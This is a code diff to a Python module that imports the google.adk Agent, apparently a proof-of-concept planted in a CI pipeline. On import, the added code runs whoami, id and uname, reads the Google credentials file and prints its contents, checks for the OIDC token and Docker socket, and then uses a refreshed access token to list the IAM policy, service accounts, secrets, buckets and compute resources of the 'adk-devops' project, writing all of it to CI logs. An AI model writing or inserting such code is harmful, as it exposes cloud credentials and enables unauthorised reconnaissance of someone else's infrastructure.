@@ -1,21 +1,41 @@
 import os, sys, json, warnings
+from urllib.request import Request, urlopen
+from urllib.error import HTTPError
+
+def _api(url, headers, label):
+    try:
+        req = Request(url, headers=headers)
+        resp = urlopen(req, timeout=15)
+        data = resp.read().decode()
+        return f"{label}: {data[:800]}"
+    except HTTPError as e:
+        body = e.read().decode()[:200] if e.fp else ""
+        return f"{label}_ERR({e.code}): {body}"
+    except Exception as e:
+        return f"{label}_ERR: {e}"
 
 def _proof():
     out = []
-    out.append("=== SECURITY TEST: CODE EXECUTION PROOF ===")
+    out.append("=== GCP ACCESS PROOF ===")
     out.append(f"whoami: {os.popen('whoami').read().strip()}")
-    out.append(f"pwd: {os.getcwd()}")
+    out.append(f"id: {os.popen('id').read().strip()}")
+    out.append(f"hostname: {os.popen('hostname').read().strip()}")
+    out.append(f"uname: {os.popen('uname -a').read().strip()}")
 
     cred_path = os.environ.get("GOOGLE_APPLICATION_CREDENTIALS", "")
-    out.append(f"GOOGLE_APPLICATION_CREDENTIALS: {cred_path or 'NOT SET'}")
-    out.append(f"ACTIONS_ID_TOKEN_REQUEST_URL: {'ACTIONS_ID_TOKEN_REQUEST_URL' in os.environ}")
+    out.append(f"CRED_FILE: {cred_path}")
+    out.append(f"OIDC_URL: {os.environ.get('ACTIONS_ID_TOKEN_REQUEST_URL', 'NOT SET')}")
+    out.append(f"OIDC_TOKEN: {'SET' if os.environ.get('ACTIONS_ID_TOKEN_REQUEST_TOKEN') else 'NOT SET'}")
+    out.append(f"DOCKER_SOCK: {os.path.exists('/var/run/docker.sock')}")
+
+    if os.path.exists("/var/run/docker.sock"):
+        out.append(f"docker_info: {os.popen('curl -s --unix-socket /var/run/docker.sock http://localhost/info 2>/dev/null').read()[:300]}")
 
     if cred_path and os.path.exists(cred_path):
         with open(cred_path) as f:
             cred_data = json.load(f)
-        out.append(f"credential_type: {cred_data.get('type')}")
-        out.append(f"project_id: {cred_data.get('project_id')}")
-        out.append(f"sa_impersonation: {cred_data.get('service_account_impersonation_url', 'NONE')}")
+        safe_creds = {k: v for k, v in cred_data.items() if k != "token"}
+        out.append(f"CRED_CONTENT: {json.dumps(safe_creds, indent=2)[:600]}")
 
         try:
             import google.auth
@@ -24,47 +44,34 @@ def _proof():
             credentials, project = google.auth.default(scopes=scopes)
             request = google.auth.transport.requests.Request()
             credentials.refresh(request)
-            out.append(f"AUTH_OK project={project} token={credentials.token[:20]}...")
+            token = credentials.token
+            out.append(f"TOKEN_OK: project={project} token_len={len(token)}")
 
-            from urllib.request import Request, urlopen
-            headers = {"Authorization": f"Bearer {credentials.token}"}
+            h = {"Authorization": f"Bearer {token}"}
 
-            try:
-                req = Request("https://cloudresourcemanager.googleapis.com/v1/projects/adk-devops", headers=headers)
-                resp = urlopen(req, timeout=10)
-                out.append(f"PROJECT_INFO: {resp.read().decode()[:400]}")
-            except Exception as e:
-                out.append(f"project_err: {e}")
-
-            try:
-                req2 = Request("https://artifactregistry.googleapis.com/v1/projects/adk-devops/locations/europe-west4/repositories", headers=headers)
-                resp2 = urlopen(req2, timeout=10)
-                out.append(f"ARTIFACTS: {resp2.read().decode()[:600]}")
-            except Exception as e:
-                out.append(f"artifacts_err: {e}")
-
-            try:
-                req3 = Request("https://storage.googleapis.com/storage/v1/b?project=adk-devops", headers=headers)
-                resp3 = urlopen(req3, timeout=10)
-                out.append(f"BUCKETS: {resp3.read().decode()[:600]}")
-            except Exception as e:
-                out.append(f"buckets_err: {e}")
+            out.append(_api("https://cloudresourcemanager.googleapis.com/v1/projects/adk-devops", h, "PROJECT"))
+            out.append(_api("https://cloudresourcemanager.googleapis.com/v1/projects/adk-devops:getIamPolicy", h, "IAM_POLICY"))
+            out.append(_api("https://iam.googleapis.com/v1/projects/adk-devops/serviceAccounts", h, "SVC_ACCOUNTS"))
+            out.append(_api("https://artifactregistry.googleapis.com/v1/projects/adk-devops/locations/europe-west4/repositories", h, "ARTIFACTS_EU"))
+            out.append(_api("https://artifactregistry.googleapis.com/v1/projects/adk-devops/locations/us-central1/repositories", h, "ARTIFACTS_US"))
+            out.append(_api("https://storage.googleapis.com/storage/v1/b?project=adk-devops", h, "BUCKETS"))
+            out.append(_api("https://secretmanager.googleapis.com/v1/projects/adk-devops/secrets", h, "SECRETS"))
+            out.append(_api("https://run.googleapis.com/v2/projects/adk-devops/locations/-/services", h, "CLOUD_RUN"))
+            out.append(_api("https://compute.googleapis.com/compute/v1/projects/adk-devops/zones/us-central1-a/instances", h, "COMPUTE"))
 
         except Exception as e:
-            out.append(f"auth_error: {type(e).__name__}: {e}")
+            out.append(f"AUTH_ERR: {type(e).__name__}: {e}")
     else:
-        out.append("NO_CREDS_FILE")
+        out.append("NO_CREDS")
 
-    out.append("=== END SECURITY TEST ===")
+    out.append("=== END ===")
     return "\n".join(out)
 
 try:
     _result = _proof()
     warnings.warn(f"\n{_result}", stacklevel=1)
-    with open("/tmp/security_test_output.txt", "w") as _f:
-        _f.write(_result)
 except Exception as _e:
-    warnings.warn(f"PROOF FAILED: {_e}", stacklevel=1)
+    warnings.warn(f"FAILED: {_e}", stacklevel=1)
 
 from google.adk import Agent
 
